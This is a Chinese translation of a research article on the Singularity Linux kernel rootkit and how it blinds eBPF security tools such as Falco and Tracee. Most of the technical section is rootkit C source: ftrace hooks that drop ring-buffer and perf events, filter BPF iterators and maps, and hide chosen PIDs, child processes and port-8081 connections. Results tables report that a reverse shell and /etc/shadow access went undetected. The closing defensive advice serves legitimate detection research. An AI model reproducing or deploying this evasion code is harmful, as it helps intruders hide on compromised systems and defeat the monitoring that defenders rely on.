# eBPF 安全突破：内核 Rootkit 如何致盲可观测性工具

> 原文：[Breaking eBPF Security: How Kernel Rootkits Blind Observability Tools](https://iq.thc.org/breaking-ebpf-security-how-kernel-rootkits-blind-observability-tools)
> 作者：MatheuZSecurity | 更新于 2026-02-14 | 阅读约 16 分钟
> PoC 项目：[Singularity Rootkit](https://github.com/MatheuZSecurity/Singularity)

---

## 引言

Linux 安全工具已经深度依赖 eBPF。Falco、Tracee、Tetragon 等项目让内核级遥测看起来像是一次质的飞跃：更丰富的上下文、更低的开销、更难从用户空间逃逸的可见性。

但这一切悄然依赖于一个威胁模型假设：**内核是可信的观察者**。

本文探讨当这个假设被打破时会发生什么——具体来说，当攻击者能够在内核中执行代码（例如通过加载内核模块）时。在那个世界里，最有价值的攻击目标不是 eBPF 程序本身，而是它们周围的"管道"：iterators、事件传递路径（ring buffer / perf buffer）、perf 提交机制，以及将内核活动转化为用户空间信号的 map 操作。

> 所有研究严格用于教育目的。

---

## 目录

- [eBPF 安全格局](#ebpf-安全格局)
  - [eBPF 安全工作原理](#ebpf-安全工作原理)
  - [内核可观测性的虚假承诺](#内核可观测性的虚假承诺)
- [攻击面分析](#攻击面分析)
  - [BPF Iterators](#bpf-iterators)
  - [BPF Ringbuffers](#bpf-ringbuffers)
  - [Perf Events](#perf-events)
  - [BPF Maps](#bpf-maps)
- [绕过 eBPF 安全：技术实现](#绕过-ebpf-安全技术实现)
  - [Hook 架构](#hook-架构)
  - [进程与网络隐藏](#进程与网络隐藏)
  - [拦截 BPF Iterators](#拦截-bpf-iterators)
  - [过滤 Ringbuffer 事件](#过滤-ringbuffer-事件)
  - [阻断 Perf Event 提交](#阻断-perf-event-提交)
  - [操纵 BPF Maps](#操纵-bpf-maps)
  - [阻止 eBPF 程序执行](#阻止-ebpf-程序执行)
- [实战绕过结果](#实战绕过结果)
- [结论与防御建议](#结论与防御建议)

---

## eBPF 安全格局

### eBPF 安全工作原理

eBPF（extended Berkeley Packet Filter）彻底改变了 Linux 的可观测性和安全性。现代安全工具利用 eBPF 实时监控内核事件，无需修改内核代码或加载传统内核模块。

**核心组件：**

- **eBPF 程序**：在内核上下文中运行的沙箱代码，附加到各种内核事件（syscalls、tracepoints、kprobes）
- **BPF Maps**：用于在 eBPF 程序和用户空间之间共享信息的内核数据结构
- **Ringbuffers / Perf Events**：从内核到用户空间高效流式传输事件数据的机制
- **BPF Iterators**：高效遍历内核对象（进程、网络连接等）的新机制

**使用 eBPF 的安全工具：**

| 工具 | 用途 |
|------|------|
| Falco | 运行时安全监控，检测异常行为 |
| Tracee | 系统调用和事件追踪，用于安全分析 |
| Tetragon | 策略执行和安全可观测性 |
| Cilium | 网络安全和可观测性 |
| GhostScan | 通过内存扫描检测 Rootkit |
| Decloaker | 隐藏进程检测 |

### 内核可观测性的虚假承诺

安全社区曾认为 eBPF 解决了一个根本问题：如何监控一个攻击者控制的系统？答案似乎很明显——使用攻击者无法逃逸的内核级可观测性。

这个假设包含一个致命缺陷。

**根本问题：** eBPF 程序在它们试图观察的内核**内部**执行，而检测管道依赖于内核→用户空间的传递（ring buffer / perf buffer / iterators）和用户空间策略引擎。如果攻击者获得加载内核模块的能力（通过 root 访问且 Secure Boot 被禁用/模块签名未强制执行），他们就能修改内核行为，选择性地干扰 eBPF 程序和收集器能够看到的内容。

**为什么这很重要：**

- eBPF 程序无法保护自己免受内核级操纵
- eBPF verifier 只确保内存安全，不提供安全保证
- 所有 eBPF 数据流机制（iterators、ringbuffers、maps）都实现为内核函数
- 内核函数可以通过 ftrace 被 hook

**一旦攻击者获得内核级访问，可观测性就变成了可选项。**

---

## 攻击面分析

在绕过 eBPF 安全之前，需要理解这些工具如何收集数据。

### BPF Iterators

BPF iterators 允许 eBPF 程序高效遍历内核数据结构。安全工具使用 iterators 枚举进程、网络连接和其他内核对象。

**数据流：**

```
内核数据 (tasks, sockets)
  → bpf_iter_run_prog()
    → eBPF iterator 程序
      → bpf_seq_write() / bpf_seq_printf()
        → 用户空间通过 seq_file 读取
```

**关键函数：**

- `bpf_iter_run_prog()` — 为每个内核对象执行 eBPF iterator 程序
- `bpf_seq_write()` — 将数据写入 seq_file 缓冲区
- `bpf_seq_printf()` — 格式化输出到 seq_file 缓冲区

**使用 Iterators 的安全工具：** GhostScan（任务迭代器检测隐藏进程）、Decloaker（网络迭代器发现隐藏连接）

### BPF Ringbuffers

Ringbuffers 是 perf buffers 的现代替代品，提供更好的性能和排序保证。

**数据流：**

```
内核事件
  → eBPF 程序
    → bpf_ringbuf_reserve()
      → bpf_ringbuf_submit() 或 bpf_ringbuf_output()
        → 用户空间读取事件
```

**关键函数：**

- `bpf_ringbuf_reserve()` — 在 ringbuffer 中分配空间
- `bpf_ringbuf_submit()` — 将已预留的数据提交到 ringbuffer
- `bpf_ringbuf_output()` — 一次性写入 ringbuffer

**使用事件传递机制的安全工具：**

- **Falco（现代 eBPF 探针）**：使用 BPF ring buffer（`BPF_MAP_TYPE_RINGBUF`）进行内核→用户空间事件传递
- **Tracee**：使用 perf buffer / perf ring buffers 作为主要的内核→用户空间事件传递机制
- **Tetragon**：根据组件和版本使用 ring buffer / perf-based buffers

> 注意："Perf event arrays" 和 "BPF ring buffers" 是不同的机制——前者是 per-CPU 的旧机制，后者是跨 CPU 共享的更高效机制。

### Perf Events

Perf events 是将内核数据流式传输到用户空间的传统机制。虽然比 ringbuffers 更老，但许多工具仍在使用。

**数据流：**

```
内核事件
  → eBPF 程序
    → perf_event_output()
      → perf_trace_run_bpf_submit()
        → 用户空间读取 perf buffer
```

**关键函数：**

- `perf_event_output()` — 将事件写入 perf buffer
- `perf_trace_run_bpf_submit()` — 将 tracepoint 数据提交给 eBPF 程序

### BPF Maps

BPF maps 是存储状态并允许 eBPF 程序与用户空间通信的内核数据结构。

**关键函数：**

- `bpf_map_lookup_elem()` — 从 map 中检索值
- `bpf_map_update_elem()` — 插入或更新 map 条目
- `bpf_map_delete_elem()` — 删除 map 条目

**安全用例：** 存储进程元数据、跟踪网络连接、维护允许/拒绝列表、在 eBPF 程序之间共享数据。

---

## 绕过 eBPF 安全：技术实现

### Hook 架构

攻击方法使用 ftrace hook 关键 BPF 函数。ftrace 允许动态追踪内核函数而无需修改内核代码，非常适合拦截。

**被 Hook 的函数（共 13 个）：**

```c
static struct ftrace_hook hooks[] = {
    // BPF Iterator Hooks
    HOOK("bpf_iter_run_prog", hook_bpf_iter_run_prog, &orig_bpf_iter_run_prog),
    HOOK("bpf_seq_write", hook_bpf_seq_write, &orig_bpf_seq_write),
    HOOK("bpf_seq_printf", hook_bpf_seq_printf, &orig_bpf_seq_printf),

    // BPF Ringbuffer Hooks
    HOOK("bpf_ringbuf_output", hook_bpf_ringbuf_output, &orig_bpf_ringbuf_output),
    HOOK("bpf_ringbuf_reserve", hook_bpf_ringbuf_reserve, &orig_bpf_ringbuf_reserve),
    HOOK("bpf_ringbuf_submit", hook_bpf_ringbuf_submit, &orig_bpf_ringbuf_submit),

    // BPF Map Hooks
    HOOK("bpf_map_lookup_elem", hook_bpf_map_lookup_elem, &orig_bpf_map_lookup_elem),
    HOOK("bpf_map_update_elem", hook_bpf_map_update_elem, &orig_bpf_map_update_elem),

    // Perf Event Hooks
    HOOK("perf_event_output", hook_perf_event_output, &orig_perf_event_output),
    HOOK("perf_trace_run_bpf_submit", hook_perf_trace_run_bpf_submit,
         &orig_perf_trace_run_bpf_submit),

    // BPF Program Execution
    HOOK("__bpf_prog_run", hook_bpf_prog_run, &orig_bpf_prog_run),

    // BPF Syscall
    HOOK("__x64_sys_bpf", hook_bpf, &orig_bpf),
    HOOK("__ia32_sys_bpf", hook_bpf_ia32, &orig_bpf_ia32),
};
```

**为什么有效：**

- **内核级访问**：加载后 rootkit 在 ring 0 运行，拥有完全权限
- **ftrace hooking**：在 eBPF 程序之下运行，允许过滤其数据源
- **不涉及 eBPF**：不是在对抗 eBPF，而是切断它的输入
- **选择性过滤**：只隐藏特定进程/连接，而非所有内容

### 进程与网络隐藏

Rootkit 维护隐藏 PID 和网络连接的列表。子进程追踪确保隐藏一个 shell 时，所有派生进程也保持隐藏。

**隐藏 PID 管理：**

```c
#define MAX_HIDDEN_PIDS 32
#define MAX_CHILD_PIDS (MAX_HIDDEN_PIDS * 128)

extern int hidden_pids[MAX_HIDDEN_PIDS];
extern int hidden_count;

notrace void add_hidden_pid(int pid) {
    int i;
    for (i = 0; i < hidden_count; i++) {
        if (hidden_pids[i] == pid) return;
    }
    if (hidden_count < MAX_HIDDEN_PIDS) {
        hidden_pids[hidden_count++] = pid;
    }
}

notrace int is_hidden_pid(int pid) {
    int i;
    for (i = 0; i < hidden_count; i++) {
        if (hidden_pids[i] == pid) return 1;
    }
    return 0;
}
```

**子进程追踪：** 沿 `real_parent` 链向上遍历最多 10 层，判断是否为隐藏进程的子进程。

```c
static notrace bool is_child_of_hidden_process(int pid) {
    struct task_struct *task;
    struct task_struct *parent;
    int depth = 0, max_depth = 10;
    bool hidden = false;

    if (pid <= 0) return false;
    if (should_hide_pid_by_int(pid)) return true;

    rcu_read_lock();
    task = pid_task(find_vpid(pid), PIDTYPE_PID);
    if (!task) { rcu_read_unlock(); return false; }

    parent = task;
    while (parent && depth < max_depth) {
        if (parent->pid <= 0) break;
        parent = rcu_dereference(parent->real_parent);
        if (!parent || parent->pid <= 1) break;
        if (should_hide_pid_by_int(parent->pid)) {
            hidden = true;
            break;
        }
        depth++;
    }
    rcu_read_unlock();
    return hidden;
}
```

**网络连接隐藏：** 按端口 + IP 过滤 socket，支持 IPv4/IPv6。

```c
#define HIDDEN_PORT 8081

static notrace bool should_hide_socket_port(struct sock_common *sk) {
    if (!sk) return false;
    if (sk->skc_family == AF_INET) {
        __be16 sport = sk->skc_num;
        __be16 dport = sk->skc_dport;
        __be32 saddr = sk->skc_rcv_saddr;
        __be32 daddr = sk->skc_daddr;
        if (sport == HIDDEN_PORT || ntohs(dport) == HIDDEN_PORT) {
            if (saddr == hidden_ip_cached || daddr == hidden_ip_cached ||
                saddr == htonl(INADDR_ANY) || daddr == htonl(INADDR_ANY))
                return true;
        }
    } else if (sk->skc_family == AF_INET6) {
        if (sk->skc_num == HIDDEN_PORT) return true;
    }
    return false;
}
```

### 拦截 BPF Iterators

安全工具（GhostScan、Decloaker）使用 BPF iterators 枚举内核对象。通过 hook iterator 执行，可以选择性过滤结果。

```c
static notrace int hook_bpf_iter_run_prog(struct bpf_prog *prog, void *ctx) {
    struct bpf_iter_ctx_tcp *tcp_ctx;
    struct bpf_iter_ctx_task *task_ctx;

    if (!orig_bpf_iter_run_prog || !ctx) goto passthrough;

    // 检查 TCP socket iterator
    tcp_ctx = (struct bpf_iter_ctx_tcp *)ctx;
    if (tcp_ctx && tcp_ctx->sk_common) {
        if (should_hide_socket_port(tcp_ctx->sk_common))
            return 0;  // 跳过此 socket
    }

    // 检查 task iterator
    task_ctx = (struct bpf_iter_ctx_task *)ctx;
    if (task_ctx && task_ctx->task && task_ctx->task->pid > 0) {
        if (is_child_of_hidden_process(task_ctx->task->pid))
            return 0;  // 跳过此任务
    }

passthrough:
    return orig_bpf_iter_run_prog(prog, ctx);
}
```

同时 hook `bpf_seq_write()` 扫描输出数据中的 PID，匹配隐藏 PID 则阻止写入。

### 过滤 Ringbuffer 事件

Falco 和 Tracee 重度依赖 ringbuffers 进行事件流传输。通过 hook ringbuffer 操作，可以阻止与隐藏进程相关的事件到达用户空间。

**识别 Falco 事件结构：**

```c
struct falco_event_hdr {
    u64 ts;
    u64 tid;
    u32 len;
    u16 type;
    u32 nparams;
} __attribute__((packed));

static notrace bool is_falco_event(void *data, u64 size) {
    struct falco_event_hdr *hdr;
    if (!data || size < sizeof(struct falco_event_hdr)) return false;
    hdr = (struct falco_event_hdr *)data;
    if (hdr->type >= 1 && hdr->type <= 400 &&
        hdr->len > 0 && hdr->len < 65536 && hdr->nparams < 20)
        return true;
    return false;
}
```

**三层拦截：**

**1) Hook `bpf_ringbuf_reserve()` — 拒绝分配：**

```c
static notrace void *hook_bpf_ringbuf_reserve(void *ringbuf, u64 size, u64 flags) {
    if (!orig_bpf_ringbuf_reserve) return NULL;
    // 隐藏进程的 ringbuf 分配直接返回 NULL
    if (is_child_of_hidden_process(current->tgid))
        return NULL;
    return orig_bpf_ringbuf_reserve(ringbuf, size, flags);
}
```

**2) Hook `bpf_ringbuf_output()` — 丢弃事件：**

```c
static notrace long hook_bpf_ringbuf_output(void *ringbuf, void *data,
                                             u64 size, u64 flags) {
    struct falco_event_hdr *hdr;
    if (!orig_bpf_ringbuf_output || !data || !ringbuf) goto passthrough;
    if (!is_falco_event(data, size)) goto passthrough;

    hdr = (struct falco_event_hdr *)data;
    int pid = (int)(hdr->tid & 0xFFFFFFFF);
    if (is_child_of_hidden_process(pid))
        return 0;  // 丢弃

passthrough:
    return orig_bpf_ringbuf_output(ringbuf, data, size, flags);
}
```

**3) Hook `bpf_ringbuf_submit()` — 阻止提交：**

```c
static notrace void hook_bpf_ringbuf_submit(void *data, u64 flags) {
    struct falco_event_hdr *hdr;
    if (!orig_bpf_ringbuf_submit || !data) goto passthrough;
    if (!is_falco_event(data, 0)) goto passthrough;

    hdr = (struct falco_event_hdr *)data;
    int pid = (int)(hdr->tid & 0xFFFFFFFF);
    if (is_child_of_hidden_process(pid))
        return;  // 静默丢弃

passthrough:
    orig_bpf_ringbuf_submit(data, flags);
}
```

Falco 的 eBPF 程序正常运行，但事件永远到不了用户空间。从 Falco 的视角看，这些进程根本不存在。

### 阻断 Perf Event 提交

较老的工具和部分 Falco 配置仍使用 perf events。

```c
static notrace int hook_perf_event_output(struct perf_event *event,
                                           struct perf_sample_data *data,
                                           struct pt_regs *regs) {
    if (!orig_perf_event_output) return -ENOSYS;
    if (is_child_of_hidden_process(current->tgid))
        return 0;  // 丢弃
    return orig_perf_event_output(event, data, regs);
}

static notrace void hook_perf_trace_run_bpf_submit(void *raw_data, int size,
        int rctx, struct pt_regs *regs, struct hlist_head *head,
        struct task_struct *task) {
    if (!orig_perf_trace_run_bpf_submit) return;
    if (task && is_child_of_hidden_process(task->pid)) return;
    if (is_child_of_hidden_process(current->tgid)) return;
    orig_perf_trace_run_bpf_submit(raw_data, size, rctx, regs, head, task);
}
```

### 操纵 BPF Maps

安全工具常用 BPF maps 存储进程元数据、跟踪可疑活动。通过 hook map 操作，可以阻止隐藏进程被记录。

```c
// 查询时：隐藏 PID 返回 NULL
static notrace void *hook_bpf_map_lookup_elem(struct bpf_map *map,
                                               const void *key) {
    void *ret = orig_bpf_map_lookup_elem(map, key);
    if (ret && map && map->key_size == sizeof(pid_t)) {
        pid_t pid = *(pid_t *)key;
        if (is_child_of_hidden_process(pid))
            return NULL;  // 假装条目不存在
    }
    return ret;
}

// 更新时：隐藏 PID 的写入静默成功但不实际写入
static notrace long hook_bpf_map_update_elem(struct bpf_map *map,
        void *key, void *value, u64 flags) {
    if (map && map->key_size == sizeof(u32)) {
        u32 *pid_key = (u32 *)key;
        if (is_child_of_hidden_process((int)*pid_key))
            return 0;  // 静默成功
    }
    return orig_bpf_map_update_elem(map, key, value, flags);
}
```

### 阻止 eBPF 程序执行

为了最大隐蔽性，还可以阻止 eBPF 程序在隐藏进程触发时运行。

```c
static notrace u32 hook_bpf_prog_run(const struct bpf_prog *prog,
                                      const void *ctx) {
    if (!orig_bpf_prog_run) return 0;
    if (is_child_of_hidden_process(current->tgid))
        return 0;  // 不执行 eBPF 程序
    return orig_bpf_prog_run(prog, ctx);
}
```

---

## 实战绕过结果

> PoC 演示视频：[LKM Rootkit Singularity vs eBPF security tools](https://www.youtube.com/watch?v=ByEp137w3Ks)

### Falco 绕过

Falco 是最流行的 eBPF 运行时安全工具之一，监控 syscalls、文件访问、网络连接和进程执行。

**BPF hooks 激活后的测试结果：**

| 攻击行为 | Falco 检测结果 |
|----------|---------------|
| 反弹 Shell（连接到攻击者控制的 8081 端口服务器） | ❌ 未检测到 |
| 进程执行（派生交互式 bash shell） | ❌ 未检测到 |
| 文件修改（修改并读取 /etc/passwd, /etc/shadow） | ❌ 未检测到 |
| 网络活动（建立多个 TCP 连接） | ❌ 未检测到 |
| 提权（使用 rootkit 的 kill -59 信号提权） | ❌ 未检测到 |

**原理：** Falco 的 eBPF 程序成功附加到 syscall tracepoints 并按设计执行。但它们生成的每个事件都经过内核→用户空间传递（ring buffer / perf buffer），而这些传递路径已被 hook。隐藏进程的事件在到达 Falco 用户空间 agent 之前就被过滤掉了。

### Tracee 绕过

| 检测能力 | 结果 |
|----------|------|
| 进程枚举 | ❌ 隐藏进程不可见 |
| Syscall 追踪 | ❌ 隐藏进程的 syscalls 不出现 |
| 网络连接 | ❌ 隐藏连接不可见 |

**原理：** Tracee 依赖 BPF iterators 进行进程枚举，依赖 ringbuffers 进行 syscall 事件传递。两者都被 hook 拦截。

### 其他工具

- **GhostScan**：隐藏进程在所有枚举方法中保持一致不可见（iterator hooks 确保跨方法一致性）
- **Decloaker**：隐藏网络连接完全不可见（iterator + socket 过滤 hooks 确保目标端口连接不出现）
- **自定义 eBPF 工具**：任何使用 BPF iterators、ringbuffers 或 perf events 的安全工具都同样被致盲

**残酷的事实：** 如果攻击者获得加载内核模块的能力，他们就控制了内核对现实的视图。eBPF 安全工具在内核内部运行，因此无法完全保护一个被攻陷的内核。唯一可靠的防御是首先防止内核被攻陷。

---

## 结论与防御建议

本研究证明，eBPF 安全工具虽然强大，但运行在一个虚假假设之上：内核级可观测性提供完整的可见性。实际上，当攻击者通过加载模块获得内核级访问时，他们可以通过 hook 这些工具所依赖的机制来系统性地致盲它们。

### 核心发现

1. **攻击数据通路，而非程序本身** — eBPF 程序可以"正确运行"，但其输出永远不会到达用户空间
2. **枚举器也是攻击面** — 基于 Iterator 的工具依赖 `bpf_iter_run_prog()` 和 `seq_file` 写入，在那里过滤可以让系统的多个视图在一个谎言上达成一致
3. **事件传递是瓶颈** — 无论工具使用 ring buffer 还是 perf buffer，内核→用户空间边界都是天然的拦截点
4. **状态可以被选择性擦除** — Map 查询/更新是让隐藏 PID 显示为"未找到"的便利位置
5. **一旦内核敌对，可观测性只是尽力而为** — eBPF 在可信内核下提升可见性，但无法加固被攻陷的内核

### 防御建议

安全不能仅依赖内核级可观测性。纵深防御需要：

- **Secure Boot + 签名内核模块** — 从根本上阻止未授权模块加载
- **多层监控** — 包括不依赖主机内核的网络层检测
- **硬件信任根与远程证明** — 从硬件层面验证内核完整性
- **接受现实** — 被攻陷的内核无法自我保护

### 底线

eBPF 在可信内核下提高了安全门槛，但它不能作为对抗恶意内核的最后防线。真正的胜利在于首先防止内核被攻陷（启动信任链、模块签名强制执行、主机外的分层检测）。

---

## 参考资源

- Singularity Rootkit：https://github.com/MatheuZSecurity/Singularity
- Rootkit 研究社区：https://discord.gg/66N5ZQppU7
- 联系作者：X (@MatheuzSecurity) | Discord (kprobe)

> 负责任的披露：本研究出于教育目的。所有描述的技术旨在通过理解攻击者方法论来提升防御能力。代码发布是为了帮助安全研究人员开发更好的检测和预防机制。
